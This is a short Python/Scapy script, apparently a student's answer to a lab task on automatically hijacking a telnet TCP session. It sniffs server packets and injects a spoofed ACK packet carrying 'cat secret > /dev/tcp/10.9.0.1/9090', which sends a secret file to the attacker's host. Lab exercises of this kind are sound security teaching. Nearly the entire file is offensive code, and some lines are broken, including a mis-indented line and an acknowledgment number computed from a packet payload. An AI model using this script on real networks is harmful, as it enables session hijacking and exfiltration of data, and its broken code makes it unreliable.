#!/usr/bin/env python3

# Task 3.2 --------------------Launching the attack automatically --------------------------
from scapy.all import *

def spoof_tcp(pkt):
        # sniffing telnet server victim packet
        # pkt[TCP].sport:23, pkt[TCP].dport:user port
        # pkt[IP].src:server IP, pkt[IP].dst:user IP
        
        # spoofing packet,from user to server
	#ip = IP(src="10.9.0.6", dst="10.9.0.5")
	ip =IP(src=pkt[IP].dst, dst=pkt[IP].src)# from user to victim
	tcp = TCP(sport= pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", 
	       seq= pkt[TCP].ack+5,  ack= pkt[TCP].seq+pkt[TCP].payload)
	data = "\r cat secret > /dev/tcp/10.9.0.1/9090 \r"
	 pkt = ip/tcp/data
	#ls(pkt)
	send(pkt, iface="br-378971cbe991", verbose=0)

pkt=sniff(iface='br-378971cbe991', filter='tcp and src host 10.9.0.5 and src port 23', prn=spoof_tcp)